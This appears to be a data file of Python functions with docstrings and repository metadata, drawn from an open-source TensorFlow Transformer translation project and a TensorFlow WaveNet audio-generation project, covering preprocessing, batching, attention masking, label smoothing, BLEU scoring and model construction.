{"docstring": "\"\"\"Load raw data -> Preprocessing -> Segmenting with sentencepice\nhp: hyperparams. argparse.\n\"\"\"\n", "func_signal": "def prepro(hp):\n", "code": "logging.info(\"# Check if raw files exist\")\ntrain1 = \"iwslt2016/de-en/train.tags.de-en.de\"\ntrain2 = \"iwslt2016/de-en/train.tags.de-en.en\"\neval1 = \"iwslt2016/de-en/IWSLT16.TED.tst2013.de-en.de.xml\"\neval2 = \"iwslt2016/de-en/IWSLT16.TED.tst2013.de-en.en.xml\"\ntest1 = \"iwslt2016/de-en/IWSLT16.TED.tst2014.de-en.de.xml\"\ntest2 = \"iwslt2016/de-en/IWSLT16.TED.tst2014.de-en.en.xml\"\nfor f in (train1, train2, eval1, eval2, test1, test2):\n    if not os.path.isfile(f):\n        raise FileNotFoundError(errno.ENOENT, os.strerror(errno.ENOENT), f)\n\nlogging.info(\"# Preprocessing\")\n# train\n_prepro = lambda x:  [line.strip() for line in open(x, 'r').read().split(\"\\n\") \\\n                  if not line.startswith(\"<\")]\nprepro_train1, prepro_train2 = _prepro(train1), _prepro(train2)\nassert len(prepro_train1)==len(prepro_train2), \"Check if train source and target files match.\"\n\n# eval\n_prepro = lambda x: [re.sub(\"<[^>]+>\", \"\", line).strip() \\\n                 for line in open(x, 'r').read().split(\"\\n\") \\\n                 if line.startswith(\"<seg id\")]\nprepro_eval1, prepro_eval2 = _prepro(eval1), _prepro(eval2)\nassert len(prepro_eval1) == len(prepro_eval2), \"Check if eval source and target files match.\"\n\n# test\nprepro_test1, prepro_test2 = _prepro(test1), _prepro(test2)\nassert len(prepro_test1) == len(prepro_test2), \"Check if test source and target files match.\"\n\nlogging.info(\"Let's see how preprocessed data look like\")\nlogging.info(\"prepro_train1:\", prepro_train1[0])\nlogging.info(\"prepro_train2:\", prepro_train2[0])\nlogging.info(\"prepro_eval1:\", prepro_eval1[0])\nlogging.info(\"prepro_eval2:\", prepro_eval2[0])\nlogging.info(\"prepro_test1:\", prepro_test1[0])\nlogging.info(\"prepro_test2:\", prepro_test2[0])\n\nlogging.info(\"# write preprocessed files to disk\")\nos.makedirs(\"iwslt2016/prepro\", exist_ok=True)\ndef _write(sents, fname):\n    with open(fname, 'w') as fout:\n        fout.write(\"\\n\".join(sents))\n\n_write(prepro_train1, \"iwslt2016/prepro/train.de\")\n_write(prepro_train2, \"iwslt2016/prepro/train.en\")\n_write(prepro_train1+prepro_train2, \"iwslt2016/prepro/train\")\n_write(prepro_eval1, \"iwslt2016/prepro/eval.de\")\n_write(prepro_eval2, \"iwslt2016/prepro/eval.en\")\n_write(prepro_test1, \"iwslt2016/prepro/test.de\")\n_write(prepro_test2, \"iwslt2016/prepro/test.en\")\n\nlogging.info(\"# Train a joint BPE model with sentencepiece\")\nos.makedirs(\"iwslt2016/segmented\", exist_ok=True)\ntrain = '--input=iwslt2016/prepro/train --pad_id=0 --unk_id=1 \\\n         --bos_id=2 --eos_id=3\\\n         --model_prefix=iwslt2016/segmented/bpe --vocab_size={} \\\n         --model_type=bpe'.format(hp.vocab_size)\nspm.SentencePieceTrainer.Train(train)\n\nlogging.info(\"# Load trained bpe model\")\nsp = spm.SentencePieceProcessor()\nsp.Load(\"iwslt2016/segmented/bpe.model\")\n\nlogging.info(\"# Segment\")\ndef _segment_and_write(sents, fname):\n    with open(fname, \"w\") as fout:\n        for sent in sents:\n            pieces = sp.EncodeAsPieces(sent)\n            fout.write(\" \".join(pieces) + \"\\n\")\n\n_segment_and_write(prepro_train1, \"iwslt2016/segmented/train.de.bpe\")\n_segment_and_write(prepro_train2, \"iwslt2016/segmented/train.en.bpe\")\n_segment_and_write(prepro_eval1, \"iwslt2016/segmented/eval.de.bpe\")\n_segment_and_write(prepro_eval2, \"iwslt2016/segmented/eval.en.bpe\")\n_segment_and_write(prepro_test1, \"iwslt2016/segmented/test.de.bpe\")\n\nlogging.info(\"Let's see how segmented data look like\")\nprint(\"train1:\", open(\"iwslt2016/segmented/train.de.bpe\",'r').readline())\nprint(\"train2:\", open(\"iwslt2016/segmented/train.en.bpe\", 'r').readline())\nprint(\"eval1:\", open(\"iwslt2016/segmented/eval.de.bpe\", 'r').readline())\nprint(\"eval2:\", open(\"iwslt2016/segmented/eval.en.bpe\", 'r').readline())\nprint(\"test1:\", open(\"iwslt2016/segmented/test.de.bpe\", 'r').readline())", "path": "transformer/prepro.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Saves hparams to path\nhparams: argsparse object.\npath: output directory.\n\nWrites\nhparams as literal dictionary to path.\n'''\n", "func_signal": "def save_hparams(hparams, path):\n", "code": "if not os.path.exists(path): os.makedirs(path)\nhp = json.dumps(vars(hparams))\nwith open(os.path.join(path, \"hparams\"), 'w') as fout:\n    fout.write(hp)", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Constructs token embedding matrix.\nNote that the column of index 0's are set to zeros.\nvocab_size: scalar. V.\nnum_units: embedding dimensionalty. E.\nzero_pad: Boolean. If True, all the values of the first row (id = 0) should be constant zero\nTo apply query/key masks easily, zero pad is turned on.\n\nReturns\nweight variable: (V, E)\n'''\n", "func_signal": "def get_token_embeddings(vocab_size, num_units, zero_pad=True):\n", "code": "with tf.variable_scope(\"shared_weight_matrix\"):\n    embeddings = tf.get_variable('weight_mat',\n                               dtype=tf.float32,\n                               shape=(vocab_size, num_units),\n                               initializer=tf.contrib.layers.xavier_initializer())\n    if zero_pad:\n        embeddings = tf.concat((tf.zeros(shape=[1, num_units]),\n                                embeddings[1:, :]), 0)\nreturn embeddings", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Applies label smoothing. See 5.4 and https://arxiv.org/abs/1512.00567.\ninputs: 3d tensor. [N, T, V], where V is the number of vocabulary.\nepsilon: Smoothing rate.\n\nFor example,\n\n```\nimport tensorflow as tf\ninputs = tf.convert_to_tensor([[[0, 0, 1], \n   [0, 1, 0],\n   [1, 0, 0]],\n\n  [[1, 0, 0],\n   [1, 0, 0],\n   [0, 1, 0]]], tf.float32)\n   \noutputs = label_smoothing(inputs)\n\nwith tf.Session() as sess:\n    print(sess.run([outputs]))\n\n>>\n[array([[[ 0.03333334,  0.03333334,  0.93333334],\n    [ 0.03333334,  0.93333334,  0.03333334],\n    [ 0.93333334,  0.03333334,  0.03333334]],\n\n   [[ 0.93333334,  0.03333334,  0.03333334],\n    [ 0.93333334,  0.03333334,  0.03333334],\n    [ 0.03333334,  0.93333334,  0.03333334]]], dtype=float32)]   \n```    \n'''\n", "func_signal": "def label_smoothing(inputs, epsilon=0.1):\n", "code": "V = inputs.get_shape().as_list()[-1] # number of channels\nreturn ((1-epsilon) * inputs) + (epsilon / V)", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Gets training / evaluation mini-batches\nfpath1: source file path. string.\nfpath2: target file path. string.\nmaxlen1: source sent maximum length. scalar.\nmaxlen2: target sent maximum length. scalar.\nvocab_fpath: string. vocabulary file path.\nbatch_size: scalar\nshuffle: boolean\n\nReturns\nbatches\nnum_batches: number of mini-batches\nnum_samples\n'''\n", "func_signal": "def get_batch(fpath1, fpath2, maxlen1, maxlen2, vocab_fpath, batch_size, shuffle=False):\n", "code": "sents1, sents2 = load_data(fpath1, fpath2, maxlen1, maxlen2)\nbatches = input_fn(sents1, sents2, vocab_fpath, batch_size, shuffle=shuffle)\nnum_batches = calc_num_batches(len(sents1), batch_size)\nreturn batches, num_batches, len(sents1)", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Loads vocabulary file and returns idx<->token maps\nvocab_fpath: string. vocabulary file path.\nNote that these are reserved\n0: <pad>, 1: <unk>, 2: <s>, 3: </s>\n\nReturns\ntwo dictionaries.\n'''\n", "func_signal": "def load_vocab(vocab_fpath):\n", "code": "vocab = [line.split()[0] for line in open(vocab_fpath, 'r').read().splitlines()]\ntoken2idx = {token: idx for idx, token in enumerate(vocab)}\nidx2token = {idx: token for idx, token in enumerate(vocab)}\nreturn token2idx, idx2token", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Loads source and target data and filters out too lengthy samples.\nfpath1: source file path. string.\nfpath2: target file path. string.\nmaxlen1: source sent maximum length. scalar.\nmaxlen2: target sent maximum length. scalar.\n\nReturns\nsents1: list of source sents\nsents2: list of target sents\n'''\n", "func_signal": "def load_data(fpath1, fpath2, maxlen1, maxlen2):\n", "code": "sents1, sents2 = [], []\nwith open(fpath1, 'r') as f1, open(fpath2, 'r') as f2:\n    for sent1, sent2 in zip(f1, f2):\n        if len(sent1.split()) + 1 > maxlen1: continue # 1: </s>\n        if len(sent2.split()) + 1 > maxlen2: continue  # 1: </s>\n        sents1.append(sent1.strip())\n        sents2.append(sent2.strip())\nreturn sents1, sents2", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Batchify data\nsents1: list of source sents\nsents2: list of target sents\nvocab_fpath: string. vocabulary file path.\nbatch_size: scalar\nshuffle: boolean\n\nReturns\nxs: tuple of\n    x: int32 tensor. (N, T1)\n    x_seqlens: int32 tensor. (N,)\n    sents1: str tensor. (N,)\nys: tuple of\n    decoder_input: int32 tensor. (N, T2)\n    y: int32 tensor. (N, T2)\n    y_seqlen: int32 tensor. (N, )\n    sents2: str tensor. (N,)\n'''\n", "func_signal": "def input_fn(sents1, sents2, vocab_fpath, batch_size, shuffle=False):\n", "code": "shapes = (([None], (), ()),\n          ([None], [None], (), ()))\ntypes = ((tf.int32, tf.int32, tf.string),\n         (tf.int32, tf.int32, tf.int32, tf.string))\npaddings = ((0, 0, ''),\n            (0, 0, 0, ''))\n\ndataset = tf.data.Dataset.from_generator(\n    generator_fn,\n    output_shapes=shapes,\n    output_types=types,\n    args=(sents1, sents2, vocab_fpath))  # <- arguments for generator_fn. converted to np string arrays\n\nif shuffle: # for training\n    dataset = dataset.shuffle(128*batch_size)\n\ndataset = dataset.repeat()  # iterate forever\ndataset = dataset.padded_batch(batch_size, shapes, paddings).prefetch(1)\n\nreturn dataset", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Processes translation outputs.\nhypotheses: list of encoded predictions\nidx2token: dictionary\n\nReturns\nprocessed hypotheses\n'''\n", "func_signal": "def postprocess(hypotheses, idx2token):\n", "code": "_hypotheses = []\nfor h in hypotheses:\n    sent = \"\".join(idx2token[idx] for idx in h)\n    sent = sent.split(\"</s>\")[0].strip()\n    sent = sent.replace(\"\u2581\", \" \") # remove bpe symbols\n    _hypotheses.append(sent.strip())\nreturn _hypotheses", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Applies label smoothing. See https://arxiv.org/abs/1512.00567.\n\nArgs:\n  inputs: A 3d tensor with shape of [N, T, V], where V is the number of vocabulary.\n  epsilon: Smoothing rate.\n\nFor example,\n\n```\nimport tensorflow as tf\ninputs = tf.convert_to_tensor([[[0, 0, 1], \n   [0, 1, 0],\n   [1, 0, 0]],\n\n  [[1, 0, 0],\n   [1, 0, 0],\n   [0, 1, 0]]], tf.float32)\n   \noutputs = label_smoothing(inputs)\n\nwith tf.Session() as sess:\n    print(sess.run([outputs]))\n\n>>\n[array([[[ 0.03333334,  0.03333334,  0.93333334],\n    [ 0.03333334,  0.93333334,  0.03333334],\n    [ 0.93333334,  0.03333334,  0.03333334]],\n\n   [[ 0.93333334,  0.03333334,  0.03333334],\n    [ 0.93333334,  0.03333334,  0.03333334],\n    [ 0.03333334,  0.93333334,  0.03333334]]], dtype=float32)]   \n```    \n'''\n", "func_signal": "def label_smoothing(inputs, epsilon=0.1):\n", "code": "K = inputs.get_shape().as_list()[-1] # number of channels\nreturn ((1-epsilon) * inputs) + (epsilon / K)", "path": "transformer/tf1.2_legacy/modules.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "\"\"\"Masks paddings on keys or queries to inputs\ninputs: 3d tensor. (h*N, T_q, T_k)\nkey_masks: 3d tensor. (N, 1, T_k)\ntype: string. \"key\" | \"future\"\n\ne.g.,\n>> inputs = tf.zeros([2, 2, 3], dtype=tf.float32)\n>> key_masks = tf.constant([[0., 0., 1.],\n                            [0., 1., 1.]])\n>> mask(inputs, key_masks=key_masks, type=\"key\")\narray([[[ 0.0000000e+00,  0.0000000e+00, -4.2949673e+09],\n    [ 0.0000000e+00,  0.0000000e+00, -4.2949673e+09]],\n\n   [[ 0.0000000e+00, -4.2949673e+09, -4.2949673e+09],\n    [ 0.0000000e+00, -4.2949673e+09, -4.2949673e+09]],\n\n   [[ 0.0000000e+00,  0.0000000e+00, -4.2949673e+09],\n    [ 0.0000000e+00,  0.0000000e+00, -4.2949673e+09]],\n\n   [[ 0.0000000e+00, -4.2949673e+09, -4.2949673e+09],\n    [ 0.0000000e+00, -4.2949673e+09, -4.2949673e+09]]], dtype=float32)\n\"\"\"\n", "func_signal": "def mask(inputs, key_masks=None, type=None):\n", "code": "padding_num = -2 ** 32 + 1\nif type in (\"k\", \"key\", \"keys\"):\n    key_masks = tf.to_float(key_masks)\n    key_masks = tf.tile(key_masks, [tf.shape(inputs)[0] // tf.shape(key_masks)[0], 1]) # (h*N, seqlen)\n    key_masks = tf.expand_dims(key_masks, 1)  # (h*N, 1, seqlen)\n    outputs = inputs + key_masks * padding_num\n# elif type in (\"q\", \"query\", \"queries\"):\n#     # Generate masks\n#     masks = tf.sign(tf.reduce_sum(tf.abs(queries), axis=-1))  # (N, T_q)\n#     masks = tf.expand_dims(masks, -1)  # (N, T_q, 1)\n#     masks = tf.tile(masks, [1, 1, tf.shape(keys)[1]])  # (N, T_q, T_k)\n#\n#     # Apply masks to inputs\n#     outputs = inputs*masks\nelif type in (\"f\", \"future\", \"right\"):\n    diag_vals = tf.ones_like(inputs[0, :, :])  # (T_q, T_k)\n    tril = tf.linalg.LinearOperatorLowerTriangular(diag_vals).to_dense()  # (T_q, T_k)\n    future_masks = tf.tile(tf.expand_dims(tril, 0), [tf.shape(inputs)[0], 1, 1])  # (N, T_q, T_k)\n\n    paddings = tf.ones_like(future_masks) * padding_num\n    outputs = tf.where(tf.equal(future_masks, 0), paddings, inputs)\nelse:\n    print(\"Check if you entered type correctly!\")\n\nreturn outputs", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Calculates bleu score and appends the report to translation\nref: reference file path\ntranslation: model output file path\n\nReturns\ntranslation that the bleu score is appended to'''\n", "func_signal": "def calc_bleu(ref, translation):\n", "code": "get_bleu_score = \"perl multi-bleu.perl {} < {} > {}\".format(ref, translation, \"temp\")\nos.system(get_bleu_score)\nbleu_score_report = open(\"temp\", \"r\").read()\nwith open(translation, \"a\") as fout:\n    fout.write(\"\\n{}\".format(bleu_score_report))\ntry:\n    score = re.findall(\"BLEU = ([^,]+)\", bleu_score_report)[0]\n    new_translation = translation + \"B{}\".format(score)\n    os.system(\"mv {} {}\".format(translation, new_translation))\n    os.remove(translation)\n\nexcept: pass\nos.remove(\"temp\")", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Converts string to number. Used for `generator_fn`.\ninp: 1d byte array.\ntype: \"x\" (source side) or \"y\" (target side)\ndict: token2idx dictionary\n\nReturns\nlist of numbers\n'''\n", "func_signal": "def encode(inp, type, dict):\n", "code": "inp_str = inp.decode(\"utf-8\")\nif type==\"x\": tokens = inp_str.split() + [\"</s>\"]\nelse: tokens = [\"<s>\"] + inp_str.split() + [\"</s>\"]\n\nx = [dict.get(t, dict[\"<unk>\"]) for t in tokens]\nreturn x", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Gets hypotheses.\nnum_batches: scalar.\nnum_samples: scalar.\nsess: tensorflow sess object\ntensor: target tensor to fetch\ndict: idx2token dictionary\n\nReturns\nhypotheses: list of sents\n'''\n", "func_signal": "def get_hypotheses(num_batches, num_samples, sess, tensor, dict):\n", "code": "hypotheses = []\nfor _ in range(num_batches):\n    h = sess.run(tensor)\n    hypotheses.extend(h.tolist())\nhypotheses = postprocess(hypotheses, dict)\n\nreturn hypotheses[:num_samples]", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Noam scheme learning rate decay\ninit_lr: initial learning rate. scalar.\nglobal_step: scalar.\nwarmup_steps: scalar. During warmup_steps, learning rate increases\n    until it reaches init_lr.\n'''\n", "func_signal": "def noam_scheme(init_lr, global_step, warmup_steps=4000.):\n", "code": "step = tf.cast(global_step + 1, dtype=tf.float32)\nreturn init_lr * warmup_steps ** 0.5 * tf.minimum(step * warmup_steps ** -1.5, step ** -0.5)", "path": "transformer/modules.py", "commit_date": "2019-09-24 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Converts int32 tensor to string tensor.\ninputs: 1d int32 tensor. indices.\nidx2token: dictionary\n\nReturns\n1d string tensor.\n'''\n", "func_signal": "def convert_idx_to_token_tensor(inputs, idx2token):\n", "code": "def my_func(inputs):\n    return \" \".join(idx2token[elem] for elem in inputs)\n\nreturn tf.py_func(my_func, [inputs], tf.string)", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Generates training / evaluation data\nsents1: list of source sents\nsents2: list of target sents\nvocab_fpath: string. vocabulary file path.\n\nyields\nxs: tuple of\n    x: list of source token ids in a sent\n    x_seqlen: int. sequence length of x\n    sent1: str. raw source (=input) sentence\nlabels: tuple of\n    decoder_input: decoder_input: list of encoded decoder inputs\n    y: list of target token ids in a sent\n    y_seqlen: int. sequence length of y\n    sent2: str. target sentence\n'''\n", "func_signal": "def generator_fn(sents1, sents2, vocab_fpath):\n", "code": "token2idx, _ = load_vocab(vocab_fpath)\nfor sent1, sent2 in zip(sents1, sents2):\n    x = encode(sent1, \"x\", token2idx)\n    y = encode(sent2, \"y\", token2idx)\n    decoder_input, y = y[:-1], y[1:]\n\n    x_seqlen, y_seqlen = len(x), len(y)\n    yield (x, x_seqlen, sent1), (decoder_input, y, y_seqlen, sent2)", "path": "transformer/data_load.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Loads hparams and overrides parser\nparser: argsparse parser\npath: directory or file where hparams are saved\n'''\n", "func_signal": "def load_hparams(parser, path):\n", "code": "if not os.path.isdir(path):\n    path = os.path.dirname(path)\nd = open(os.path.join(path, \"hparams\"), 'r').read()\nflag2val = json.loads(d)\nfor f, v in flag2val.items():\n    parser.f = v", "path": "transformer/utils.py", "commit_date": "2019-02-18 00:00:00", "repo_name": "Kyubyong/transformer", "stars": 4118, "license": "apache-2.0", "language": "python", "size": 5578}
{"docstring": "'''Generate a few samples using the naive method and\nperform sanity checks on the output.'''\n", "func_signal": "def testGenerateSimple(self):\n", "code": "waveform = tf.placeholder(tf.int32)\nnp.random.seed(0)\ndata = np.random.randint(128, size=1000)\nproba = self.net.predict_proba(waveform)\n\nwith self.test_session() as sess:\n    sess.run(tf.global_variables_initializer())\n    proba = sess.run(proba, feed_dict={waveform: data})\n\nself.assertAllEqual(proba.shape, [128])\nself.assertTrue(np.all((proba >= 0) & (proba <= (128 - 1))))", "path": "tensorflow-wavenet/test/test_generation.py", "commit_date": "2017-04-24 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''This function creates all variables used by the network.\nThis allows us to share them between multiple calls to the loss\nfunction and generation function.'''\n\n", "func_signal": "def _create_variables(self):\n", "code": "var = dict()\n\nwith tf.variable_scope('wavenet'):\n    if self.global_condition_cardinality is not None:\n        # We only look up the embedding if we are conditioning on a\n        # set of mutually-exclusive categories. We can also condition\n        # on an already-embedded dense vector, in which case it's\n        # given to us and we don't need to do the embedding lookup.\n        # Still another alternative is no global condition at all, in\n        # which case we also don't do a tf.nn.embedding_lookup.\n        with tf.variable_scope('embeddings'):\n            layer = dict()\n            layer['gc_embedding'] = create_embedding_table(\n                'gc_embedding',\n                [self.global_condition_cardinality,\n                 self.global_condition_channels])\n            var['embeddings'] = layer\n\n    with tf.variable_scope('causal_layer'):\n        layer = dict()\n        if self.scalar_input:\n            initial_channels = 1\n            initial_filter_width = self.initial_filter_width\n        else:\n            initial_channels = self.quantization_channels\n            initial_filter_width = self.filter_width\n        layer['filter'] = create_variable(\n            'filter',\n            [initial_filter_width,\n             initial_channels,\n             self.residual_channels])\n        var['causal_layer'] = layer\n\n    var['dilated_stack'] = list()\n    with tf.variable_scope('dilated_stack'):\n        for i, dilation in enumerate(self.dilations):\n            with tf.variable_scope('layer{}'.format(i)):\n                current = dict()\n                current['filter'] = create_variable(\n                    'filter',\n                    [self.filter_width,\n                     self.residual_channels,\n                     self.dilation_channels])\n                current['gate'] = create_variable(\n                    'gate',\n                    [self.filter_width,\n                     self.residual_channels,\n                     self.dilation_channels])\n                current['dense'] = create_variable(\n                    'dense',\n                    [1,\n                     self.dilation_channels,\n                     self.residual_channels])\n                current['skip'] = create_variable(\n                    'skip',\n                    [1,\n                     self.dilation_channels,\n                     self.skip_channels])\n\n                if self.global_condition_channels is not None:\n                    current['gc_gateweights'] = create_variable(\n                        'gc_gate',\n                        [1, self.global_condition_channels,\n                         self.dilation_channels])\n                    current['gc_filtweights'] = create_variable(\n                        'gc_filter',\n                        [1, self.global_condition_channels,\n                         self.dilation_channels])\n\n                if self.use_biases:\n                    current['filter_bias'] = create_bias_variable(\n                        'filter_bias',\n                        [self.dilation_channels])\n                    current['gate_bias'] = create_bias_variable(\n                        'gate_bias',\n                        [self.dilation_channels])\n                    current['dense_bias'] = create_bias_variable(\n                        'dense_bias',\n                        [self.residual_channels])\n                    current['skip_bias'] = create_bias_variable(\n                        'slip_bias',\n                        [self.skip_channels])\n\n                var['dilated_stack'].append(current)\n\n    with tf.variable_scope('postprocessing'):\n        current = dict()\n        current['postprocess1'] = create_variable(\n            'postprocess1',\n            [1, self.skip_channels, self.skip_channels])\n        current['postprocess2'] = create_variable(\n            'postprocess2',\n            [1, self.skip_channels, self.quantization_channels])\n        if self.use_biases:\n            current['postprocess1_bias'] = create_bias_variable(\n                'postprocess1_bias',\n                [self.skip_channels])\n            current['postprocess2_bias'] = create_bias_variable(\n                'postprocess2_bias',\n                [self.quantization_channels])\n        var['postprocessing'] = current\n\nreturn var", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "# Calculate inverse mu-law companding and dequantization\n", "func_signal": "def manual_mu_law_decode(signal, quantization_channels):\n", "code": "mu = quantization_channels - 1\ny = signal.astype(np.float32)\n\ny = 2 * (y / mu) - 1\nx = np.sign(y) * (1.0 / mu) * ((1.0 + mu)**abs(y) - 1.0)\nreturn x", "path": "tensorflow-wavenet/test/test_mu_law.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Construct an efficient incremental generator.'''\n", "func_signal": "def _create_generator(self, input_batch, global_condition_batch):\n", "code": "init_ops = []\npush_ops = []\noutputs = []\ncurrent_layer = input_batch\n\nq = tf.FIFOQueue(\n    1,\n    dtypes=tf.float32,\n    shapes=(self.batch_size, self.quantization_channels))\ninit = q.enqueue_many(\n    tf.zeros((1, self.batch_size, self.quantization_channels)))\n\ncurrent_state = q.dequeue()\npush = q.enqueue([current_layer])\ninit_ops.append(init)\npush_ops.append(push)\n\ncurrent_layer = self._generator_causal_layer(\n                    current_layer, current_state)\n\n# Add all defined dilation layers.\nwith tf.name_scope('dilated_stack'):\n    for layer_index, dilation in enumerate(self.dilations):\n        with tf.name_scope('layer{}'.format(layer_index)):\n\n            q = tf.FIFOQueue(\n                dilation,\n                dtypes=tf.float32,\n                shapes=(self.batch_size, self.residual_channels))\n            init = q.enqueue_many(\n                tf.zeros((dilation, self.batch_size,\n                          self.residual_channels)))\n\n            current_state = q.dequeue()\n            push = q.enqueue([current_layer])\n            init_ops.append(init)\n            push_ops.append(push)\n\n            output, current_layer = self._generator_dilation_layer(\n                current_layer, current_state, layer_index, dilation,\n                global_condition_batch)\n            outputs.append(output)\nself.init_ops = init_ops\nself.push_ops = push_ops\n\nwith tf.name_scope('postprocessing'):\n    variables = self.variables['postprocessing']\n    # Perform (+) -> ReLU -> 1x1 conv -> ReLU -> 1x1 conv to\n    # postprocess the output.\n    w1 = variables['postprocess1']\n    w2 = variables['postprocess2']\n    if self.use_biases:\n        b1 = variables['postprocess1_bias']\n        b2 = variables['postprocess2_bias']\n\n    # We skip connections from the outputs of each layer, adding them\n    # all up here.\n    total = sum(outputs)\n    transformed1 = tf.nn.relu(total)\n\n    conv1 = tf.matmul(transformed1, w1[0, :, :])\n    if self.use_biases:\n        conv1 = conv1 + b1\n    transformed2 = tf.nn.relu(conv1)\n    conv2 = tf.matmul(transformed2, w2[0, :, :])\n    if self.use_biases:\n        conv2 = conv2 + b2\n\nreturn conv2", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "# Generate every possible quantized level.\n", "func_signal": "def testMinMaxRange(self):\n", "code": "x = np.array(range(QUANT_LEVELS), dtype=np.int)\n\n# Decode back into float scalars.\nwith self.test_session() as sess:\n    # Decode into floating-point scalar.\n    decoded = mu_law_decode(x, QUANT_LEVELS)\n    all_scalars = sess.run(decoded)\n\n# Our range should be exactly [-1,1].\nmax_val = np.max(all_scalars)\nmin_val = np.min(all_scalars)\nEPSILON = 1e-10\nself.assertNear(max_val, 1.0, EPSILON)\nself.assertNear(min_val, -1.0, EPSILON)", "path": "tensorflow-wavenet/test/test_mu_law.py", "commit_date": "2017-03-10 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
{"docstring": "'''Construct the WaveNet network.'''\n", "func_signal": "def _create_network(self, input_batch, global_condition_batch):\n", "code": "outputs = []\ncurrent_layer = input_batch\n\n# Pre-process the input with a regular convolution\ncurrent_layer = self._create_causal_layer(current_layer)\n\noutput_width = tf.shape(input_batch)[1] - self.receptive_field + 1\n\n# Add all defined dilation layers.\nwith tf.name_scope('dilated_stack'):\n    for layer_index, dilation in enumerate(self.dilations):\n        with tf.name_scope('layer{}'.format(layer_index)):\n            output, current_layer = self._create_dilation_layer(\n                current_layer, layer_index, dilation,\n                global_condition_batch, output_width)\n            outputs.append(output)\n\nwith tf.name_scope('postprocessing'):\n    # Perform (+) -> ReLU -> 1x1 conv -> ReLU -> 1x1 conv to\n    # postprocess the output.\n    w1 = self.variables['postprocessing']['postprocess1']\n    w2 = self.variables['postprocessing']['postprocess2']\n    if self.use_biases:\n        b1 = self.variables['postprocessing']['postprocess1_bias']\n        b2 = self.variables['postprocessing']['postprocess2_bias']\n\n    if self.histograms:\n        tf.histogram_summary('postprocess1_weights', w1)\n        tf.histogram_summary('postprocess2_weights', w2)\n        if self.use_biases:\n            tf.histogram_summary('postprocess1_biases', b1)\n            tf.histogram_summary('postprocess2_biases', b2)\n\n    # We skip connections from the outputs of each layer, adding them\n    # all up here.\n    total = sum(outputs)\n    transformed1 = tf.nn.relu(total)\n    conv1 = tf.nn.conv1d(transformed1, w1, stride=1, padding=\"SAME\")\n    if self.use_biases:\n        conv1 = tf.add(conv1, b1)\n    transformed2 = tf.nn.relu(conv1)\n    conv2 = tf.nn.conv1d(transformed2, w2, stride=1, padding=\"SAME\")\n    if self.use_biases:\n        conv2 = tf.add(conv2, b2)\n\nreturn conv2", "path": "tensorflow-wavenet/wavenet/model.py", "commit_date": "2018-04-06 00:00:00", "repo_name": "ibab/tensorflow-wavenet", "stars": 5396, "license": "mit", "language": "python", "size": 335}
